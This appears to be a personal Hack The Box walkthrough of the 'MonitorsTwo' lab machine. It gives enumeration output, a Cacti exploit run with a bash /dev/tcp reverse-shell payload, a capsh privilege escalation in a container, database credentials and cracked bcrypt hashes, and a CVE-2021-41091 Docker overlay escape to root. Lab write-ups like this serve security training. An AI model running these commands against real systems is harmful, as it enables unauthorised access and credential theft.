#HackTheBox #linux 
# 1- enum
## nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## gobuster
```
	/cache                (Status: 301) [Size: 313] [--> http://10.10.11.211/cache/]
	/docs                 (Status: 301) [Size: 312] [--> http://10.10.11.211/docs/]
	/images               (Status: 301) [Size: 314] [--> http://10.10.11.211/images/]
	/include              (Status: 301) [Size: 315] [--> http://10.10.11.211/include/]
	/index.php            (Status: 200) [Size: 13844]
	/install              (Status: 301) [Size: 315] [--> http://10.10.11.211/install/]
	/lib                  (Status: 301) [Size: 311] [--> http://10.10.11.211/lib/]
	/LICENSE              (Status: 200) [Size: 15171]
	/plugins              (Status: 301) [Size: 315] [--> http://10.10.11.211/plugins/]
	/resource             (Status: 301) [Size: 316] [--> http://10.10.11.211/resource/]
	/scripts              (Status: 301) [Size: 315] [--> http://10.10.11.211/scripts/]
	/service              (Status: 301) [Size: 315] [--> http://10.10.11.211/service/]
```

# exploit
┌──(root㉿kali)-[/home/kali/Desktop/HTB/monitorstwo]
└─# python3 cacti_exploit http://htb -c "bash -c 'bash -i >& /dev/tcp/10.10.16.30/1234 0>&1'"

# foothold on docker
[www-data@50bca5e748b0:/var/www/html$] cat README.md
```
for table in `mysql -e "SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema='cacti' AND engine!='MEMORY'" cacti | grep -v TABLE_NAME`;
do 
   echo "Converting $table";
   mysql -e "ALTER TABLE $table ENGINE=InnoDB ROW_FORMAT=Dynamic CHARSET=utf8mb4" cacti;
done
```
```
	Good luck, and enjoy Cacti!

# Running Database Upgrade Script

sudo -u cacti php -q cli/upgrade_database.php --forcever='cat include/cacti_version'

```

# Find
[www-data@50bca5e748b0:/var/www/html$] cat user_admin.php | grep pass
```
SELECT password_history FROM user_auth WHERE id = ?
```


# PrivEsc 1
[bash-5.1$] /sbin/capsh --gid=0 --uid=0 --
```
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

[root@50bca5e748b0:/var/www/html#] find ./ -type f -name conf* 2>/dev/null
./include/fa/js/conflict-detection.js
./include/fa/js/conflict-detection.min.js
./include/fa/svgs/brands/confluence.svg
./include/config.php


[root@50bca5e748b0:/var/www/html#] cat include/config.php
```
/*
 * Make sure these values reflect your actual database/host/user/password
 */

$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'root';
$database_password = 'root';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;
```


[root@50bca5e748b0:/var/www/html#] mysql -D cacti -h db -u root -p
```
MySQL [cacti]> select password,username from user_auth;                      
select password,username from user_auth;
+--------------------------------------------------------------+----------+
| password                                                     | username |
+--------------------------------------------------------------+----------+
| $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC | admin    |
| 43e9a4ab75570f5b                                             | guest    |
| $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C | marcus   |
+--------------------------------------------------------------+----------+
```

┌──(root㉿kali)-[/home/kali/Desktop/HTB/monitorstwo]
└─# john hash_marcus -wordlist=/usr/share/wordlists/rockyou.txt                 
```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (?)  
```

## ssh creds 
[marcus:funkymonkey]

# LateralMouvement on host
## PrivEsc 
┌──(root㉿kali)-[/home/kali/Desktop/tools]
└─# ssh marcus@htb
```
╔══════════╣ Mails (limit 50)
     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/mail/marcus                                                                      
     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/spool/mail/marcus
```

[marcus@monitorstwo:~$] cat /var/mail/marcus
```
CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.
```

## Find
CVE-2021-41091 : https://github.com/UncleJ4ck/CVE-2021-41091/tree/main

## Exploit
[marcus@monitorstwo:/tmp$] cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$] ./bin/bash -p     

[bash-5.1#] cat /root/root.txt
	fadaf40fc018a3383a9facf2190b2615
